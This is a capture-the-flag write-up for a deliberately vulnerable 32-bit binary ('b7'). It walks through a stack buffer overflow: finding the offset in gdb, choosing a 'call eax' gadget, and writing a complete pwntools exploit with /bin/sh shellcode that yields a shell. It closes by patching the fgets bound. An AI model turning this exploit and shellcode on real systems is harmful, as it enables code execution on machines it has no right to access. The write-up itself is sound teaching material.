Let's first check out to see if this challenge has any binary hardening mitigations.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b7$ pwn checksec b7
[*] '/Hackery/escape/buf_ovf/b7/b7'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE
```

So as you can see, we are a bit lucky in the fact that this has no binary hardening. Let's look at the source code.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b7$ cat b7.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

void pls_stop()
{
	unsigned int ret_adr;
	char buf0[50];
	fgets(buf0, 100, stdin);
	ret_adr = __builtin_return_address(0);

	if ((ret_adr & 0xf0000000) == 0xf0000000)
	{
		printf("Due to the lack of research, we had to make budget cuts.\n");
		exit(0);
	}
	printf("When you get done with hacking, your research is at %p. Just incase you feel like doing work.\n", ret_adr);
	strdup(buf0);
}

int main()
{
	printf("If you do not get back to your research now, we will have to implement corrective solutions.\n");
	pls_stop();
}
```

So we can see something new with this challenge. After the call to fgets, it checks to see if the return address stored in the eip register starts with a "0xf", and if it does the program kills itself. This sucks for us because all address on the stack (where we could potentially push shellcode), or address from libc (where we could pull the address from system) will just kill the program if we try to call it. However we see something further down. We see that it calls strdup on our input, which should store an address to our input in the eax register (which is a primary I/O register). Let's see if there are any ROP Gadgets that can help us.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b7$ ROPgadget --binary b7 | grep eax
0x0804843d : adc al, 0x68 ; inc eax ; cdq ; add al, 8 ; call eax
0x08048476 : adc byte ptr [eax + 0x68], dl ; inc eax ; cdq ; add al, 8 ; call edx
0x08048441 : add al, 8 ; call eax
0x0804834c : add byte ptr [eax], al ; add esp, 8 ; pop ebx ; ret
0x08048575 : add byte ptr [eax], al ; mov ecx, dword ptr [ebp - 4] ; leave ; lea esp, dword ptr [ecx - 4] ; ret
0x080484a5 : add eax, 0x8049944 ; add ecx, ecx ; ret
0x08048443 : call eax
0x08048440 : cdq ; add al, 8 ; call eax
0x0804843c : in al, dx ; adc al, 0x68 ; inc eax ; cdq ; add al, 8 ; call eax
0x08048475 : in al, dx ; adc byte ptr [eax + 0x68], dl ; inc eax ; cdq ; add al, 8 ; call edx
0x080484cb : in eax, -0x7d ; in al, dx ; adc al, 0x50 ; call edx
0x0804843a : in eax, -0x7d ; in al, dx ; adc al, 0x68 ; inc eax ; cdq ; add al, 8 ; call eax
0x0804843f : inc eax ; cdq ; add al, 8 ; call eax
0x08048479 : inc eax ; cdq ; add al, 8 ; call edx
0x080484c7 : je 0x80484c4 ; push ebp ; mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx
0x0804834f : les ecx, ptr [eax] ; pop ebx ; ret
0x08048446 : les edx, ptr [eax] ; leave ; ret
0x08048547 : les edx, ptr [eax] ; nop ; leave ; ret
0x080484ca : mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx
0x0804843e : push 0x8049940 ; call eax
0x080484cf : push eax ; call edx
0x08048477 : push eax ; push 0x8049940 ; call edx
0x080484c9 : push ebp ; mov ebp, esp ; sub esp, 0x14 ; push eax ; call edx
0x08048474 : sub esp, 0x10 ; push eax ; push 0x8049940 ; call edx
0x0804843b : sub esp, 0x14 ; push 0x8049940 ; call eax
0x080484cc : sub esp, 0x14 ; push eax ; call edx
```

Here is something interesting...

```
0x08048443 : call eax
```

So that will call eax. EAX stores an address to our input. So if we hit the eip register with "0x08048443", the stack will pivot to that location and call our input (known as a stack pivot exploit). And since the stack is executable, nothing will stop it. Let's find the offset.

```
gdb-peda$ disas pls_stop 
Dump of assembler code for function pls_stop:
   0x080484db <+0>:	push   ebp
   0x080484dc <+1>:	mov    ebp,esp
   0x080484de <+3>:	sub    esp,0x48
   0x080484e1 <+6>:	mov    eax,ds:0x8049940
   0x080484e6 <+11>:	sub    esp,0x4
   0x080484e9 <+14>:	push   eax
   0x080484ea <+15>:	push   0x64
   0x080484ec <+17>:	lea    eax,[ebp-0x3e]
   0x080484ef <+20>:	push   eax
   0x080484f0 <+21>:	call   0x8048390 <fgets@plt>
   0x080484f5 <+26>:	add    esp,0x10
   0x080484f8 <+29>:	mov    eax,DWORD PTR [ebp+0x4]
   0x080484fb <+32>:	mov    DWORD PTR [ebp-0xc],eax
   0x080484fe <+35>:	mov    eax,DWORD PTR [ebp-0xc]
   0x08048501 <+38>:	and    eax,0xf0000000
   0x08048506 <+43>:	cmp    eax,0xf0000000
   0x0804850b <+48>:	jne    0x8048527 <pls_stop+76>
   0x0804850d <+50>:	sub    esp,0xc
   0x08048510 <+53>:	push   0x8048600
   0x08048515 <+58>:	call   0x80483a0 <puts@plt>
   0x0804851a <+63>:	add    esp,0x10
   0x0804851d <+66>:	sub    esp,0xc
   0x08048520 <+69>:	push   0x0
   0x08048522 <+71>:	call   0x80483b0 <exit@plt>
   0x08048527 <+76>:	sub    esp,0x8
   0x0804852a <+79>:	push   DWORD PTR [ebp-0xc]
   0x0804852d <+82>:	push   0x804863c
   0x08048532 <+87>:	call   0x8048370 <printf@plt>
   0x08048537 <+92>:	add    esp,0x10
   0x0804853a <+95>:	sub    esp,0xc
   0x0804853d <+98>:	lea    eax,[ebp-0x3e]
   0x08048540 <+101>:	push   eax
   0x08048541 <+102>:	call   0x8048380 <strdup@plt>
   0x08048546 <+107>:	add    esp,0x10
   0x08048549 <+110>:	nop
   0x0804854a <+111>:	leave  
   0x0804854b <+112>:	ret    
End of assembler dump.
gdb-peda$ b *pls_stop+26
Breakpoint 1 at 0x80484f5
gdb-peda$ r
Starting program: /Hackery/escape/buf_ovf/b7/b7 
If you do not get back to your research now, we will have to implement corrective solutions.
0000
```

One wall of text later...

```
Breakpoint 1, 0x080484f5 in pls_stop ()
gdb-peda$ x/s $ebp-0x3e
0xffffcffa:	"0000\n"
gdb-peda$ info frame
Stack level 0, frame at 0xffffd040:
 eip = 0x80484f5 in pls_stop; saved eip = 0x8048572
 called by frame at 0xffffd060
 Arglist at 0xffffd038, args: 
 Locals at 0xffffd038, Previous frame's sp is 0xffffd040
 Saved registers:
  ebp at 0xffffd038, eip at 0xffffd03c
```

And onto the quest for the holy grail...

```
>>> 0xffffd03c - 0xffffcffa
66
```

So the offset is 66. For the shellcode we are just going to recycle the shellcode from b5, since it is the same architecture it will work. The shellcode we have is 34 charactes long, so our offset only needs to be 32 after it. Now that we have the rop gadget, offset, and shellcode we can write the exploit.

```
#Import pwntools
from pwn import *

#Start the binary
target = process('./b7')

#Print the text from the binary to reach fgets
print target.recvline();

#Create the offset
offset = "0"*32

#Declare the shellcode
shellcode = "\x6a\x18\x58\xcd\x80\x50\x50\x5b\x59\x6a\x46\x58\xcd\x80\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x99\x31\xc9\xb0\x0b\xcd\x80"

#Declare the ROP Gadget
gadget = p32(0x08048443)

#Construct the payload
payload = shellcode + offset + gadget

#Let's write the payload to a file, for gdb troubleshooting
p = open("in", "w")
p.write(payload)

#Send the payload
target.sendline(payload)

#Drop to an interactive shell
target.interactive()
```

Now let's try it...

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b7$ python exploit.py 
[+] Starting local process './b7': Done
If you do not get back to your research now, we will have to implement corrective solutions.

[*] Switching to interactive mode
When you get done with hacking, your research is at 0x8048443. Just incase you feel like doing work.
$ echo Is it working?
Is it working?
$ ls
b7  b7.c  core    exploit.py  in    out  peda-session-b7.txt  peda-session-dash.txt
$ cat out
If you don't stop, we will start implementing actual security. With guns, and sharks. You hate those, don't you? Level Cleared!
$ exit
[*] Got EOF while reading in interactive
$ exit
[*] Process './b7' stopped with exit code 0
[*] Got EOF while sending in interactive
```

Just like that, we pwned the binary. Now let's patch it.

```
guyinatuxedo@tux:/Hackery/escape/buf_ovf/b7$ cat b7_secure.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

void pls_stop()
{
	unsigned int ret_adr;
	char buf0[50];
	fgets(buf0, sizeof(buf0), stdin);
	ret_adr = __builtin_return_address(0);

	if ((ret_adr & 0xf0000000) == 0xf0000000)
	{
		printf("Due to the lack of research, we had to make budget cuts.\n");
		exit(0);
	}
	printf("When you get done with hacking, your research is at %p. Just incase you feel like doing work.\n", ret_adr);
	strdup(buf0);
}

int main()
{
	printf("If you do not get back to your research now, we will have to implement corrective solutions.\n");
	pls_stop();
}



guyinatuxedo@tux:/Hackery/escape/buf_ovf/b7$ python -c 'print "0"*500' | ./b7_secure 
If you do not get back to your research now, we will have to implement corrective solutions.
When you get done with hacking, your research is at 0x8048572. Just incase you feel like doing work.
```

Just like that, we patched the binary.
